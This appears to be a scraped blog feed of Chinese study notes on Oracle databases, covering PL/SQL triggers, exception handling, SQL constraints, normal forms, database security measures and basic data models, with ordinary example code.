触发器本身 即该TRIGGER 被触发之后的目的和意图，正是触发器本身要做的事情 例如：PL/SQL 块。 触发频率 说明触发器内定义的动作被执行的次数 即语句级(STATEMENT)触发器和行级(ROW)触发器 语句级(STATEMENT)触发器 是指当某触发事件发生时，该触发器只执行一次 行级(ROW)触发器 是指当某触发事件发生时，对受到该操作影响的每一行数据，触发器都单独执行一次 创建触发器语法12345678CREATE [OR REPLACE] TRIGGER trigger_name &#123;BEFORE | AFTER &#125; &#123;INSERT | DELETE | UPDATE [OF column [, column …]]&#125; ON [schema.] table_name [REFERENCING &#123;OLD [AS] old | NEW [AS] new&#125;] [FOR EACH ROW ] [WHEN condition] trigger_body; 注： BEFORE 和AFTER 指出触发器的触发时序分别为前触发和后触发方式 前触发是在执行触发事件之前触发当前所创建的触发器 后触发是在执行触发事件之后触发当前所创建的触发器 FOR EACH ROW 说明触发器为行触发器 行触发器和语句触发器的区别表现在 行触发器要求当一个DML语句操走影响数据库中的多行数据时，对于其中的每个数据行，只要它们符合触发约束条件，均激活一次触发器 语句触发器将整个语句操作作为触发事件，当它符合约束条件时，激活一次触发器 当省略FOR EACH ROW 选项时 BEFORE 和AFTER 触发器为语句触发器， INSTEAD OF 触发器则为行触发器 REFERENCING 说明相关名称 在行触发器的PL/SQL块和WHEN 子句中可以使用相关名称参照当前的新、旧列值，默认的相关名称分别为OLD和NEW。 触发器的PL/SQL块中应用相关名称时，必须在它们之前加冒号(:)，但在WHEN子句中则不能加冒号。 WHEN 说明触发约束条件 Condition 为一个逻辑表达时，其中必须包含相关名称，而不能包含查询语句，也不能调用PL/SQL 函数 WHEN 子句指定的触发约束条件 只能用在BEFORE 和AFTER 行触发器中 不能用在INSTEAD OF 行触发器和其它类型的触发器中 当一个基表被修改( INSERT, UPDATE, DELETE)时要执行的存储过程，执行时根据其所依附的基表改动而自动触发因此与应用程序无关，用数据库触发器可以保证数据的一致性和完整性。 每张表最多可创建12种触发器123456789101112BEFORE INSERT BEFORE INSERT FOR EACH ROW AFTER INSERT AFTER INSERT FOR EACH ROW BEFORE UPDATE BEFORE UPDATE FOR EACH ROW AFTER UPDATE AFTER UPDATE FOR EACH ROW BEFORE DELETE BEFORE DELETE FOR EACH ROW AFTER DELETE AFTER DELETE FOR EACH ROW 触发器执行顺序 执行 BEFORE语句级触发器 对于受语句影响的每一行： 执行 BEFORE行级触发器 执行 DML语句 执行 AFTER行级触发器 执行 AFTER语句级触发器 创建DML触发器 触发器名与过程名和包的名字不一样，它是单独的名字空间，因而触发器名可以和表或过程有相同的名字 但在一个模式中触发器名不能相同 示例12345678--例： 建立一个触发器, 当职工表 emp 表被删除一条记录时，把被删除记录写到职工表删除日志表中去。 CREATE OR REPLACE TRIGGER del_emp BEFORE DELETE ON scott.emp FOR EACH ROW BEGIN --将修改前数据插入到日志记录表 del_emp ,以供监督使用。 INSERT INTO emp_his(deptno,empno,ename,job,mgr,sal,comm,hiredate)VALUES (:old.deptno,:old.empno,:old.ename,:old.job,:old.mgr,:old.sal, :old.comm,:old.hiredate); END; 触发器的限制 CREATE TRIGGER语句文本的字符长度不能超过32KB (由于大小受到限制也不能使用long,blob这样的大变量.如果实在是有复杂的逻辑,要弄个很复杂的触发器,可以通过procedure或function实现一部分功能,然后调用) 触发器体内的SELECT 语句只能为SELECT … INTO …结构，或者为定义游标所使用的SELECT 语句 触发器中不能使用数据库事务控制语句 COMMIT， ROLLBACK, SVAEPOINT 语句 由触发器所调用的过程或函数也不能使用数据库事务控制语句 触发器中不能使用LONG, LONG RAW 类型 触发器内可以参照LOB类型列的列值，但不能通过 :NEW 修改LOB列中的数据 (LOB类型：将信息文件（十进制、二进制）、图像甚至音频信息采用数据库作为保存载体时，就需要使用lob类型数据。每个LOB可以有2GB。) (LOB类型：将信息文件（十进制、二进制）、图像甚至音频信息采用数据库作为保存载体时，就需要使用lob类型数据。每个LOB可以有2GB。) 行级别触发器中的相关标识符当触发器被触发时，要使用被插入、更新或删除的记录中的列值，有时要使用操作前、后列的值 ，可以使用： :NEW 修饰符访问操作完成后列的值 :OLD 修饰符访问操作完成前列的值 特性 INSERT UPDATE DELETE NEW 有效 有效 NULL OLD NULL 有效 有效 示例12345678CREATE OR REPLACE TRIGGER upd_emp BEFORE update ON scott.emp REFERENCING new AS nn old AS oo FOR EACH ROW WHEN (nn.sal &gt; 2000) BEGIN dbms_output.put_line(:nn.sal||&#39;------&#39;||:oo.sal); END; DML触发器中的谓词在DML触发器中，他们被不同的DML语句所触发，有三个布尔型函数来确定操作到底是什么： 谓词 描述 INSERTING 如果触发语句是INSERT，则为TRUE，否则为FALSE UPDATING 如果触发语句是UPDATE，则为TRUE，否则为FALSE DELETING 如果触发语句是DELETE，则为TRUE，否则为FALSE 1234567891011121314151617--例CREATE OR REPLACE TRIGGER check_emp BEFORE update OR insert OR delete ON scott.emp REFERENCING new AS nn old AS oo FOR EACH ROW WHEN (nn.sal &gt; 2000) BEGIN IF INSERTING THEN dbms_output.put_line(&#39;THE OPERATION IS INSERT&#39;); ELSIF UPDATING THEN dbms_output.put_line(&#39;THE OPERATION IS UPDATE&#39;); ELSIF DELETING THEN dbms_output.put_line(&#39;THE OPERATION IS DELETE&#39;); ELSE dbms_output.put_line(&#39;OTHERS OPERATION&#39;); END IF; END; 创建替代触发器语法1234567CREATE [OR REPLACE] TRIGGER trigger_name INSTEAD OF &#123;INSERT | DELETE | UPDATE [OF column [, column …]]&#125; ON [schema.] view_name [REFERENCING &#123;OLD [AS] old | NEW [AS] new&#125;] [FOR EACH ROW ] trigger_body; 注： INSTEAD OF 使ORACLE激活触发器，而不执行触发事件。 与DML触发器不同，DML触发器是在DML操作之外运行的，而替代触发器则代替激发它的DML语句运行。 替代触发器是行一级的。只能对视图和对象视图建立INSTEAD OF触发器，而不能对表、模式和数据库建立INSTEAD OF 触发器。 而INSTEAD OF 触发器则为行触发器。 REFERENCING 说明相关名称，在行触发器的PL/SQL块和WHEN子句中可以使用相关名称参照当前的新、旧列值，默认的相关名称分别为OLD和NEW。 触发器的PL/SQL块中应用相关名称时，必须在它们之前加冒号(:)，但在WHEN子句中则不能加冒号。 WHEN 子句说明触发约束条件。 Condition 为一个逻辑表达时，其中必须包含相关名称，而不能包含查询语句，也不能调用PL/SQL 函数。 WHEN 指定的触发约束条件只能用在BEFORE 和AFTER 行触发器中，不能用在INSTEAD OF 行触发器和其它类型的触发器中。 INSTEAD_OF 用于对视图的DML触发，由于视图有可能是由多个表进行联结(join)而成，因而并非是所有的联结都是可更新的。但可以按照所需的方式执行更新 替代触发器应用举例我们可以创建INSTEAD_OF触发器来为 DELETE 操作执行所需的处理，即删除EMP表中所有基准行： 123456CREATE OR REPLACE TRIGGER emp_view_delete INSTEAD OF DELETE ON emp_view FOR EACH ROW BEGIN DELETE FROM emp WHERE deptno&#x3D; :old.deptno; END emp_view_delete; DELETE FROM emp_view WHERE deptno&#x3D;10; 创建系统触发器 系统触发器可以在DDL或数据库系统上被触发。DDL指的是数据定义语言，如CREATE 、ALTER及DROP 等。 数据库系统事件包括数据库服务器的启动或关闭，用户的登录与退出、数据库服务错误等。 语法123456CREATE OR REPLACE TRIGGER [sachema.] trigger_name &#123;BEFORE|AFTER&#125; &#123;ddl_event_list | database_event_list&#125; ON &#123; DATABASE | [schema.] SCHEMA &#125; [WHEN_clause] trigger_body; 注： ddl_event_list为一个或多个DDL事件，事件间用 OR 分开； database_event_list为一个或多个数据库事件，事件间用 OR 分开； 系统事件触发器既可以建立在一个模式上，又可以建立在整个数据库上。 当建立在模式(SCHEMA)之上时，只有模式所指定用户的DDL操作和它们所导致的错误才激活触发器, 默认时为当前用户模式。 当建立在数据库(DATABASE)之上时，该数据库所有用户的DDL操作和他们所导致的错误，以及数据库的启动和关闭均可激活触发器。 要在数据库之上建立触发器时，要求用户具有ADMINISTER DATABASE TRIGGER权限。 系统触发器的种类和事件出现的时机（前或后）： 事件 允许的时机 说明 启动STARTUP 之后 实例启动时激活 关闭SHUTDOWN 之前 实例正常关闭时激活 服务器错误SERVERERROR 之后 只要有错误就激活 登录LOGON 之后 成功登录后激活 注销LOGOFF 之前 开始注销时激活 创建CREATE 之前，之后 在创建之前或之后激活 撤消DROP 之前，之后 在撤消之前或之后激活 变更ALTER 之前，之后 在变更之前或之后激活 示例123456789101112131415CREATE OR REPLACE TRIGGER trig4_ddl AFTER CREATE OR ALTER OR DROP ON DATABASE DECLARE Event VARCHAR2(20); Typ VARCHAR2(20); Name VARCHAR2(30); Owner VARCHAR2(30); BEGIN --读取DDL事件属性 Event :&#x3D; SYSEVENT; --激活触发器的事件名称 Typ :&#x3D; DICTIONARY_OBJ_TYPE; --语句所操作的数据库对象类型 Name :&#x3D; DICTIONARY_OBJ_NAME; --语句所操作的数据库对象名称 Owner :&#x3D; DICTIONARY_OBJ_OWNER; --语句所操作的数据库对象所有者名称 -- 将事件属性插入到事件日志表中 INSERT INTO scott.eventlog(eventname,obj_type,obj_name,obj_owner) VALUES(event, typ, name, owner); END; 重新编译触发器 如果在触发器内调用其它函数或过程，当这些函数或过程被删除或修改后，触发器的状态将被标识为无效。当DML语句激活一个无效触发器时，ORACLE将重新编译触发器代码，如果编译时发现错误，这将导致DML语句执行失败。 在PL/SQL程序中可以调用ALTER TRIGGER语句重新编译已经创建的触发器，格式为： 1ALTER TRIGGER [schema.] trigger_name COMPILE 删除触发器 语法1DROP TRIGGER trigger_name; 注： 当删除其他用户模式中的触发器名称，需要具有DROP ANY TRIGGER系统权限 当删除建立在数据库上的触发器时，用户需要具有ADMINISTER DATABASE TRIGGER系统权限 当删除表或视图时，建立在这些对象上的触发器也随之删除 触发器状态有效状态(ENABLE) 当触发事件发生时，处于有效状态的数据库触发器TRIGGER 将被触发。 无效状态(DISABLE) 当触发事件发生时，处于无效状态的数据库触发器TRIGGER 将不会被触发，此时就跟没有这个数据库触发器(TRIGGER) 一样。 数据库TRIGGER的这两种状态可以互相转换 ALTER TRIGGER语句一次只能改变一个触发器的状态 ALTER TABLE语句则一次能够改变与指定表相关的所有触发器的使用状态。 ALTER TIGGER1234ALTER TIGGER trigger_name [DISABLE | ENABLE ]; --例：ALTER TRIGGER emp_view_delete DISABLE; ALTER TABLE1234ALTER TABLE [schema.]table_name &#123;ENABLE|DISABLE&#125; ALL TRIGGERS; --例：使表EMP 上的所有TRIGGER 失效： ALTER TABLE emp DISABLE ALL TRIGGERS; 触发器和数据字典相关数据字典： USER_TRIGGERS ALL_TRIGGERS DBA_TRIGGERS 1234--例：SELECT TRIGGER_NAME, TRIGGER_TYPE, TRIGGERING_EVENT, TABLE_OWNER, BASE_OBJECT_TYPE, REFERENCING_NAMES, STATUS, ACTION_TYPE FROM user_triggers;","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"plsql异常处理","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/plsql错误处理/","text":"plsql异常处理异常处理的概念异常情况处理(EXCEPTION)是用来处理正常执行过程中未预料的事件,程序块的异常处理预定义的错误和自定义错误,由于PL/SQL程序块一旦产生异常而没有指出如何处理时,程序就会自动终止整个程序运行。 有三种类型的异常错误 : 类型 描述 预定义 ( Predefined )错误 ORACLE预定义的异常情况大约有22个。对这种异常情况的处理，无需在程序中定义，由ORACLE自动将其引发 非预定义 ( Predefined )错误 即其他标准的ORACLE错误。对这种异常情况的处理，需要用户在程序中定义，然后由ORACLE自动将其引发 用户定义(User_define) 错误 程序执行过程中，出现编程人员认为的非正常情况。对这种异常情况的处理，需要用户在程序中定义，然后显式地在程序中将其引发。 异常处理结构:12345EXCEPTION WHEN first_exception THEN &lt;code to handle first exception &gt; WHEN second_exception THEN &lt;code to handle second exception &gt; WHEN OTHERS THEN &lt;code to handle others exception &gt; END; 作用范围 PL/SQL的异常捕获只针对执行部分，在声明部分产生的异常是无法捕获的 异常处理部分本身导致的异常同样也是无法捕获的，解决方法和声明部分一样，需要在外层进行捕获。 异常错误每个异常错误都包含异常错误号（错误代码）和错误描述信息 错误代码（错误代码） 错误描述信息 ORA-00001 违反唯一约束条件 ORA-00017 请求会话以设置跟踪事件 ORA-00018 超出最大会话数 ORA-00019 超出最大会话许可数 ORA-00020 超出最大进程数 () ORA-00021 会话附属于其它某些进程；无法转换会话 ORA-00022 无效的会话 ID；访问被拒绝 ORA-00023 会话引用进程私用内存；无法分离会话 ORA-00024 单一进程模式下不允许从多个进程注册 预定义的异常处理 错误号 异常名称 说明 ORA-0001 DUP_VAL_ON_INDEX 试图破坏一个唯一性限制 ORA-0051 TIMEOUT_ON_RESOURCE 在等待资源时发生超时 ORA-0061 TRANSACTION_BACKED_OUT 由于发生死锁事务被撤消 ORA-1001 INVALID_CURSOR 试图使用一个未打开的游标 ORA-1012 NOT_LOGGED_ON 没有连接到ORACLE ORA-1017 LOGIN_DENIED 无效的用户名/口令 ORA-1403 NO_DATA_FOUND SELECT INTO没有找到数据 ORA-1422 TOO_MANY_ROWS SELECT INTO 返回多行 ORA-1476 ZERO_DIVIDE 试图被零除 ORA-1722 INVALID_NUMBER 转换一个数字失败 ORA-6500 STORAGE_ERROR 内存不够或内存被破坏引发的内部错误 ORA-6501 PROGRAM_ERROR 内部错误,需重新安装数据字典视图和pl/sql包 ORA-6502 VALUE_ERROR 赋值操作，变量长度不足，触发该异常 ORA-6504 ROWTYPE_MISMATCH 宿主游标变量与 PL/SQL变量有不兼容行类型 ORA-6511 CURSOR_ALREADY_OPEN 试图打开一个已打开的游标 ORA-6530 ACCESS_INTO_NULL 试图为null 对象的属性赋值 ORA-6531 COLLECTION_IS_NULL 试图给没有初始化的嵌套表变量或者varry变量赋值 ORA-6532 SUBSCRIPT_OUTSIDE_LIMIT 对嵌套或varray索引使用了负数 ORA-6533 SUBSCRIPT_BEYOND_COUNT 对嵌套或varray索引的引用大于集合中元素的个数 ORA-6592 CASE_NOT_FOUND 当Case语句的When子句没有包含必需分支或者Else子句时，会触发该异常。 ORA-30625 SELF_IS_NULL 试图在null实例上调用成员方法 ORA-1410 SYS_INVALID_ROWID 试图将无效的字符串转化成ROWID 对于预定义异常情况的处理，只需在PL/SQL块的异常处理部分，直接引用相应的异常情况名，并对其完成相应的异常错误处理即可。 示例1234567891011121314151617181920--例： 更新指定员工工资，如工资小于1500，则加100 DECLARE v_empno emp.empno%TYPE :&#x3D;7900; v_sal emp.sal%TYPE; BEGIN SELECT sal INTO v_sal FROM emp WHERE empno&#x3D;v_empno; IF v_sal&lt;&#x3D;1500 THEN UPDATE emp SET sal&#x3D;sal+100 WHERE empno&#x3D;v_empno; DBMS_OUTPUT.PUT_LINE(&#39;编码为&#39;||v_empno||&#39;员工工资已更新!&#39;); ELSE DBMS_OUTPUT.PUT_LINE(&#39;编码为&#39;||v_empno||&#39;员工工资已经超过规定值!&#39;); END IF; EXCEPTION WHEN NO_DATA_FOUND THEN DBMS_OUTPUT.PUT_LINE(&#39;数据库中没有编码为&#39;||v_empno||&#39;的员工&#39;); WHEN TOO_MANY_ROWS THEN DBMS_OUTPUT.PUT_LINE(&#39;程序运行错误!请使用游标&#39;); WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||’---‘||SQLERRM); END; 非预定义的异常处理预定义的异常错误大约有24个，而错误代码成千上万如ORA-00020 。 对于这类异常情况的处理，首先必须对非定义的ORACLE错误进行定义 步骤如下： 在PL/SQL 块的声明部分定义异常情况： &lt;异常情况&gt; EXCEPTION; 将其定义好的异常情况，与标准的ORACLE错误联系起来，使用EXCEPTION_INIT语句 PRAGMA EXCEPTION_INIT(&lt;异常情况&gt;, &lt;错误代码&gt;)； 在PL/SQL 块的异常情况处理部分对异常情况做出相应的处理。 示例1234567891011121314--例：删除指定部门的记录信息，以确保该部门没有员工。 DECLARE v_deptno dept.deptno%TYPE :&#x3D;&amp;deptno; deptno_remaining EXCEPTION; PRAGMA EXCEPTION_INIT(deptno_remaining, -2292); &#x2F;* -2292 是违反references完整性约束的错误代码 *&#x2F; BEGIN DELETE FROM dept WHERE deptno&#x3D;v_deptno; EXCEPTION WHEN deptno_remaining THEN DBMS_OUTPUT.PUT_LINE(&#39;违反数据完整性约束!&#39;); WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||’---‘||SQLERRM); END; 用户自定义的异常处理当与一个异常错误相关的错误出现时，就会隐含触发该异常错误。用户定义的异常错误是通过显式使用 RAISE 语句来触发。当引发一个异常错误时，控制就转向到 EXCEPTION块异常错误部分，执行错误处理代码。 步骤如下 ： 在PL/SQL 块的声明部分定义异常情况 ： &lt;异常情况&gt; EXCEPTION; RAISE &lt;异常情况&gt; 在PL/SQL 块的异常情况处理部分对异常情况做出相应的处理。 示例123456789101112131415--例DECLARE v_empno emp.empno%TYPE :&#x3D;&amp;empno; no_result EXCEPTION; BEGIN UPDATE emp SET sal&#x3D;sal+100 WHERE empno&#x3D;v_empno; IF SQL%NOTFOUND THEN RAISE no_result; END IF; EXCEPTION WHEN no_result THEN DBMS_OUTPUT.PUT_LINE(&#39;你的数据更新语句失败了!&#39;); WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||’---‘||SQLERRM); END; RAISE_APPLICATION_ERROR函数调用DBMS_STANDARD(ORACLE提供的包)包所定义的RAISE_APPLICATION_ERROR过程，可以重新定义异常错误消息，它为应用程序提供了一种与ORACLE交互的方法。 错误号的范围是-20,000到-20,999。错误信息是文本字符串，最多为2048字节。 示例123456789101112--例：declare v_deptid departments.department_id%type :&#x3D; &amp;no; v_dname departments.department_name%type; begin select department_name into v_dname from departments where department_id &#x3D; v_deptid; dbms_output.put_line(v_dname); exception when others then raise_application_error(-20001 , &#39;department&#39;||v_deptid||&#39; does not exists&#39;); end; 异常错误传播由于异常错误可以在声明部分和执行部分以及异常错误部分出现，因而在不同部分引发的异常错误也不一样。 可执行部分产生的异常： 当一个异常错误在执行部分引发时，有下列情况： 如果当前块对该异常错误设置了处理，则执行它并成功完成该块的执行，然后控制转给包含块。 如果没有对当前块异常错误设置定义处理器，则通过在包含块中引发它来传播异常错误。然后对该包含块执行步骤1)。 声明部分产生的异常：如果在声明部分引起 异常 情况，即在声明部分出现错误，那么该错误就能影响到其它的块 示例12345678910111213141516171819202122232425262728293031--例1：DECLARE Abc number(3):&#x3D;’abc’; --其它语句 BEGIN --其它语句 EXCEPTION WHEN OTHERS THEN --其它语句 END; &#x2F;*由于Abc number(3)&#x3D;’abc’; 出错，尽管在EXCEPTION中说明了WHEN OTHERS THEN语句，但WHEN OTHERS THEN也不会被执行。 *&#x2F;--例2：BEGIN DECLARE Abc number(3):&#x3D;’abc’; --其它语句 BEGIN --其它语句 EXCEPTION WHEN OTHERS THEN --其它语句 END; EXCEPTION WHEN OTHERS THEN --其它语句 END; &#x2F;*在该错误语句块的外部有一个异常错误，则该错误能被抓住*&#x2F; 异常处理的SQLCode和SQL Errm**注意： ** 某给定异常（如自定义）只能在异常处理部分的处理一次。如果有多个异常处理器（多次when），则会抛出PLS-00483异常。 SQLCODE返回当前的错误代码，SQLERRM返回当前的错误信息。对于用户自定义异常SQLCODE返回值为‘1’，SQLERRM返回值为‘User-defined Exception’ Oracle错误信息的最大长度是512字节 SQLCODE和SQLERRM的值先赋给本地变量，不能直接用于SQL语句","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"sql约束","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/sql约束/","text":"sql约束 名称 关键字 含义 所属级别 默认值约束 DEFAULT 可以为某一列指定默认值。当用户插入或修改元组时，在没有为该列赋值的情况下可以用指定的默认值填入该列。 列级约束 非空值约束 NOT NULL 当某列的值不能为空值时（即要求新建或修改元组时， （即要求新建或修改元组时，该列必须填入值），则可以在设置为非空值约束 列级约束 唯一型约束 UNIQUE 用于限定基本表上的某个列或某些列的组合（称为唯一性键），在不同元组（行）中的取值不能相同（空值除外）。 可以是列级约束也可以是表级约束 主键约束 PRIMARY KEY 用于定义基本表的主键（码），以实现实体完整性规则。 可以是列级约束也可以是表级约束 外键约束 FOREIGN KEY 是一个表（称外键表、从表或参照关系）中的一个或多个列的组合，它的取值要么为空值，要么是引用另一个表（称主键表、主表或被参照关系）的主键或唯一性键的值。 可以是列级约束也可以是表级约束 检查约束 CHECK 可以定义插入或修改某个元组时，元组应满足的约束条件，通常用于限定某个列的取值范围或与其他列的关系。 可以是列级约束也可以是表级约束","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"数据库关系范式","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/数据库关系范式/","text":"数据库关系范式数据依赖关系模式中的各属性之间相互依赖、相互制约的联系称为数据依赖 函数依赖 多值依赖 连接依赖 关系模式应满足的基本要求 数据库中的数据冗余应该尽可能的少 关系数据库不能因为数据更新操作而引起数据不一致的问题 插入数据时，不能产生插入异常现象 删除数据时，不能产生删除异常现象 数据库设计应考虑查询要求，数据组织应合理 完全函数依赖和部分函数依赖(Sno,Cno)-&gt;Grade(完全函数依赖) 学号和课程号组成集合才能一定推出唯一的成绩，所以(Sno,Cno)为决定因素 因为Sno-&gt;Age所以(Sno,Cno)-&gt;Age(部分函数依赖) 学号是学号和课程号组成集合的子集,而学号就可以推出年龄,所以年龄部分函数依赖于(Sno,Cno)这个集合 说明 只用当决定因素是组合属性时，讨论部分函数依赖才有意义 当决定是单属性时，只能是完全函数依赖 例如，在关系模式S（SNO，SN，AGE，DEPT），决定因素为单属性SNO，有SNO-&gt;（SN，AGE，DEPT），不存在部分函数依赖。 范式 基本思想：消除关系模式中的数据冗余，消除数据依赖中的不合适的部分，解决数据插入、删除时发生异常现象 范式：把关系数据库设计出来的关系模式要满足一定的条件。 第一范式：满足基本规范要求的关系模式 第二范式：在第一范式中进一步满足一些要求 第三范式：以此类推产生了第三范式等概念 注意：每个范式都规定了一些限制条件 第一范式 定义：如果一个关系模式R中的所有属性都是不可分的最小数据项，则R∈1NF 注意： NF是关系模式的一个最起码的要求 不满足1NF的数据库模式不能称之为关系数据库 但满足1NF的关系模式不一定是好的关系模式 第二范式 定义：如果关系模式R∈1NF，且R中每一个非主属性完全函数依赖于码，则R∈2NF 结论： 从1NF关系中消除非主属性对关系键的部分函数依赖，则可得到2NF关系 如果R的关系为单属性，或R的全体属性均为主属性，则R∈2NF 2NF规范化 2NF规范化是指把1NF关系模式通过投影分解转换成2NF关系模式的集合 分解时遵循的基本原则就是“一事一地”，让一个关系只描述一个实体或者实体间的联系。如果多于一个实体或联系，则进行投影分解 第三范式 定义：如果关系模式R∈2NF，且R中每个非主属性都不传递依赖于码，则R∈3NF 3NF规范化： 3NF是指把2NF关系模式通过投影分解转换成3NF关系模式的集合 和2NF规范化时遵循的原则相同，即“一事一地”，让一个关系只描述一个实体或者实体间的联系 BC范式 定义：关系模式R(U,F)∈1NF，若对R的每个函数依赖x-&gt;y，有x必含候选码，则R∈BCNF 优点： 数据冗余降低 不存在插入异常 不存在删除异常 不存在更新异常 性质： 若R∈BCNF，则R∈2NF 若R∈BCNF，则R∈3NF 若R∈3NF，则R不一定是BCNF 若R∈3NF，且候选码唯一，则R是BCNF 第四范式 定义：关系模式R(U,D)∈1NF，U是属性全集，x，y是U的子集，D是R上的数据依赖集，如果对R的每个非平凡多值依赖X-&gt;-&gt;y，x都含候选码，则R∈4NF。 123456789(1) R是BCNF。R候选关键字为XY，F中只有一个函数依赖，而该函数依赖的左部包含了R的候选关键字。 (2) R是3NF。R候选关键字为X Y和XZ，R中所有属性都是主属性，不存在非主属性对候选关键字的传递依赖。 (3) R是BCNF。R候选关键字为X和Y，因为X→YZ，所以X→Y，X→Z，由于F中有Y→Z，Y→X，因此Z是直接函数依赖于X，而不是传递依赖于X。又因为F的每一函数依赖的左部都包含了任一候选关键字，所以R是BCNF。 (4) R是BCNF。R候选关键字为X，而且F中每一个函数依赖的左部包含了候选关键字X。 (5) R是1NF。R候选关键字为WX，则Y，Z为非主属性，又由于X→Z，因此F中存在非主属性对候选关键字的部分函数依赖","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"数据库安全","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/第10周课/","text":"第十周课数据库安全数据库安全 数据库安全措施1.用户标识和鉴定 用户名和用户标识标明用户身份 口令 随机数对密码加密 2.存取控制 根据预先定义好的用户权限进行存取控制 两部分:数据对象和操作类型 3.视图 保证程序的逻辑独立性,将机密数据隐藏起来 不同的DBMS都提供了建立视图的机制 开发数据系统时,应尽可能给不同用户分配不同的视图 4.审计 审计时一种预防手段,监测可能的不合法访问 审讯追踪技术使用专门的文件或数据库访问自动记录用户对数据库的所有操作,利用这些信息就能找出非法存取数据的人 5.数据加密 ORACLE中的角色、用户、权限角色分类 用户类型 应用类型 oracle预定义的角色 oracle允许DBA定义角色 CONNECT RESOURCE DBA 数据库完整措施触发器","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"Oracle数据库第二周","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/第2周课/","text":"Oracle数据库第二周1.1数据、信息与数据处理 数据和信息 数据库和数据库表 数据库管理系统 数据库系统 1.1基本概念 1.数据 **数据(Data)**：是数据库中存储的基本对象 数据的定义：描述事物的符号记录，是信息的符号表示，或称载体 数据的种类：数字、文本、图形、图像、声 ：数字、文本、图形、图像、声音、视频、学生的档案记录等 信息：数据的内涵，是数据的语义解释 数据处理:将数据转换成信息的过程，包括对数据收集、存储、分类、加工、检索、维护等一系列活动 总结： 数据是信息的载体 数据是信息的载体 数据是信息的表述方式 数据是信息的表述方式 信息是从数据而来的 信息是从数据而来的知识 2.数据库 **数据库(Database,简称 简称DB)**：是长期储存在计算机内、有组织、可共享的大量数据的集合 基本特征： 数据按一定的数据模型组织、描述和储存 以文件方式存储，常见数据库文件扩展名： MDF-SQL Server； MDB-Access； 1- DBC-VFP（Visual FoxPro） 可为各种用户共享 冗余度较小 数据独立性较高 易扩展 3.数据库管理系统 **数据库管理系统（ 数据库管理系统（Database Management System，简称 简称DBMS） ** 管理数据库的 管理数据库的系统软件 系统软件，是数据库系统的核心 位于用户与操作系统之间的一层数据管理软件 主要功能： 数据定义功能（DDL） 数据操纵功能（DML）：CRUD 数据库的事务管理和运行管理 数据库的建立和维护功能 1.2数据管理技术的发展新一代数据库 面向对象的数据库 分布式数据库 并行数据库 图形图像数据库 主流数据库：Oracle公司：Oracle、MySQL（开源） Microsoft公司：Microsoft SQL Server MySQL分支：MariaDB（开源） 参考链接： 一图看数据库发展历史 数据库排名 1.3数据库系统的组成数据库系统1.4模型根据应用目的，模型分为两个层次： 概念模型 按用户的观点，独立于计算机实现的，只用来描述和组织所关心的信息结构的概念数据模型，强调语义 数据库设计人员和用户之间进行交流的语言 对应于信息世界 概念模型用于信息世界的建模； 是现实世界到机器世界的第一层抽象； 是数据库设计的有力工具； 数据库设计人员和用户之间进行交流的语言； 数据模型 按计算机系统的观点，直接面向计算机系统的，描述数据库中数据的逻辑结构的基本数据模型 对应于数据世界（机器世界） 包括逻辑模型和物理模型 逻辑模型：采用某一数据模型组织数据，如关系模型。 物理模型：描述数据在系统内部的表示方式和存取方法 用来形式化描述 数据 数据之间的联系 数据语义和约束规则 数据模型的组成要素 数据结构 数据结构的概念 描述数据库的组成对象，以及对象之间的联系 数据结构描述的内容 对象的数据类型、内容、性质，如关系模型中的属性 与数据之间联系有关的对象 数据操作 对数据库中各种对象(型)的实例(值)允许执行的操作及有关的操作规则，是对系统动态特性的描述 数据操作的类型 查询 更新(包括插入、删除、修改) 数据的完整性约束 一组完整性规则的集合。 完整性规则：给定的数据模型中数据及其联系所具有的制约和依存规则 用以限定符合数据模型的数据库状态以及状态的变化，以保证数据的正确、有效、相容。 最常用的数据模型 非关系模型 层次模型(Hierarchical Model) 层次模型是数据库系统中最早出现的数据模型 层次数据库系统的典型代表是IBM公司1968年推出的IMS（Information Management System）数据库管理系统 层次模型用树形结构来表示各类实体以及实体间的联系 通过 通过树形结构表示实体及联系。如描述学校管理 形结构表示实体及联系。如描述学校管理机构。个 机构。每个结点 结点表示一个 表示一个实体（型） 实体（型），箭头表示 箭头表示实体（型）间的联系（由父到子）。 主要特点： 有且仅有一个根结点；每个非根结点 非根结点有且仅有一个父(直接上层)结点。它最适合表示实体的一对多联系。 网状模型(Network Model) 典型代表是DBTG系统： 70年代由DBTG提出的一个系统方案 奠定了数据库系统的基本概念、方法和技术 实际系统 Cullinet Software Inc.公司的IDMS Univac公司的DMS1100 Honeywell公司的IDS/2 HP公司的IMAGE 通过网状结构 网状结构表示实体及联系。“网”中每个结点表示一个实体(型)，结点之间箭头表示实体(型)间的联系。 网状数据模型主要特点：网状数据模型可能有多个根结点，某些非根结点可能有多个父结点，适合表示实体的多对多联系。 特点： 适合复杂的关系 最少的数据冗余 算法复杂、专用 优点 优点:能直观、形象地描述实体及其联系，易于被人们所理解和掌握 。 缺点 缺点:数据结构较复杂，存储数据需要更多的链接指针；在检索数据时，需要考虑数据的存储路径；在插入或删除数据时，涉及到调整链接指针 关系模型(Relational Model) 1970年美国IBM公司San 